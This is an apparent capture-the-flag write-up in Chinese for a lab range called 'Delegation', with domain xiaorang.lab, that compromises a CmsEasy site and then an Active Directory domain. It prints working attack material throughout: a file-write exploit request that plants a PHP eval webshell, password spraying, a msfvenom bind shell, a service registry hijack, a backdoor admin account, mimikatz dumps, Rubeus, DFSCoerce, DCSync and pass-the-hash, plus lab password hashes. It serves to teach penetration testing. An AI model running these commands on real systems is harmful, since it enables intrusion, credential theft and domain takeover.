# Delegation

## flag1

进来已经写明了是一个**cmseasy**

![image-20251215222852082](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251215222852082.png)

用dirsearch和fscan扫一下

![image-20251215223057366](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251215223057366.png)

![image-20251215223116898](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251215223116898.png)

发现有/admin登录界面，存在弱口令admin/123456

![7](D:\Pictures\Screenshots\7.png)

进来可以看到版本，去找版本漏洞

[CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞/)

poc

```
POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.31.96
Content-Length: 57
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;
Connection: close

sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php phpinfo();?>
```

可以写入`<?php eval($_POST[1]);?>`

蚁剑连接

suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

![img](https://i-blog.csdnimg.cn/direct/a5ff60b0cac44262996c003c60d96f5a.png)

利用方式查询https://gtfobins.github.io/

## flag2

给了一个Adrian用户

上传fscan扫描，搭建代理进内网

```none
172.22.4.36:3306 open
172.22.4.19:445 open
172.22.4.45:445 open
172.22.4.7:445 open
172.22.4.19:139 open
172.22.4.45:139 open
172.22.4.7:139 open
172.22.4.19:135 open
172.22.4.45:135 open
172.22.4.7:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:22 open
172.22.4.36:21 open
172.22.4.7:88 open
[*] NetInfo:
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] NetInfo:
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] NetInfo:
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
[*] NetBios: 172.22.4.45     XIAORANG\WIN19                 
[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393 
[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:中文网页标题
[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server
```

因为给的提示是WIN19，所以选择1打172.22.4.45

```
crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19
```

爆出来是babygirl1

用kali远程桌面登录，提示密码过期要先修改一次密码

```
rdesktop 172.22.4.45
```

![img](https://i-blog.csdnimg.cn/direct/7e464d5566f143c4ab7af8052240eb41.png)

读flag02发现没有权限，桌面上有一个风险文件可以对 `gupdate` 服务的注册表项进行修改

![image-20240110161515183](https://img2023.cnblogs.com/blog/3144128/202401/3144128-20240113181006187-1492507510.png)

用msf生成一个正向连接的木马

```
msfvenom -p windows/meterpreter/bind_tcp LPORT=1337 -f exe > exp.exe
```

kali可以直接共享文件夹

```
# 先创建共享目录
mkdir -p /root/transfer

# 启动 rdesktop 并映射磁盘
rdesktop -u Adrian -p 'YourPassword' -r disk:KALI=/root/transfer 172.22.4.45
```

修改注册表路径并启动进程

```
reg add HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Adrian\Desktop\exp.exe"
 
sc start gupdate
```

用msf监听

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set LPORT 1337
set RHOST 172.22.4.45
exploit
```

连接成功后发现进程很快就没了，需要进行进程迁移

ps查看当前进程

getpid查看当前进程进程序号

![1](D:\Pictures\Screenshots\1.png)

migrate迁移到一个system权限的进程中持久化

```
cat  /users/administrator/flag/flag02.txt
```

![3](D:\Pictures\Screenshots\3.png)

## flag3+4

hashdump获取本地哈希，进行哈希传递创建一个自己的管理员账户

![4](D:\Pictures\Screenshots\4.png)

```
net user fisher fisher123 /add
net localgroup administrators fisher /add添加至管理员组
```

然后就可以用管理员账户进行远程桌面连接

用管理员模式打开猕猴桃抓一下域用户哈希

```
privilege::debug 
sekurlsa::logonpasswords full
```

#### 1️⃣ 普通域用户

#### 👤 用户：`fisher`

- **Domain**: `WIN19` → 实际属于域 `xiaorang.lab`
- **NTLM Hash**: `14a9619aa07de13f41d2e0528c241451`
- **Kerberos 密码**: `fisher123`
- **登录方式**: RemoteInteractive（如 RDP）
- **SID**: `S-1-5-21-...-1004`

#### 👤 用户：`Adrian`

- **Domain**: `WIN19`
- **NTLM Hash**: `f7f2f14d1571ad848b5caae0afe576aa`
- **无明文密码**
- **SID**: `S-1-5-21-...-1003`

------

### 2️⃣ 机器账户

#### 🤖 账户：`WIN19$`（当前主机的机器账户）

- **所属域**: `XIAORANG` / `xiaorang.lab`

| 来源（Session）          | NTLM Hash                          |
| ------------------------ | ---------------------------------- |
| 多数条目（DWM, UMFD 等） | `238970e9d6e44a859bd0fb1912567da9` |
| 少数条目（如 DWM-1）     | `5943c35371c96f19bda7b8e67d041727` |

查看域内委派关系

```
python findDelegation.py xiaorang.lab/'WIN19$' -hashes :5943c35371c96f19bda7b8e67d041727 -dc-ip 172.22.4.7
```

![img](https://i-blog.csdnimg.cn/direct/a70c96e7deec464d93ac1395570eabc2.png)

存在一个非约束性委派

上传一个Rubeus准备票据抓取

```
Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
```

利用强制认证让DC访问WIN19，拿到其TGT票据

```
python dfscoerce.py -u "WIN19$" -hashes :5943c35371c96f19bda7b8e67d041727 -d xiaorang.lab win19 172.22.4.7
```

将票据注入内存

```
Rubeus.exe ptt /ticket:票据
```

dc拥有dcsync的权限，所以直接可以获取域内所有的hash

猕猴桃获取

```none
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
```

或者用msf

```
load kiwi  # 调用mimikatz模块
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit  # 导出域内所有用户的信息(包括哈希值)
```

成功拿到域管hash

Administrator   4889f6553239ace1f7c47fa2c619c252

用psexec进行连接拿到两个flag

![5](D:\Pictures\Screenshots\5.png)

![6](D:\Pictures\Screenshots\6.png)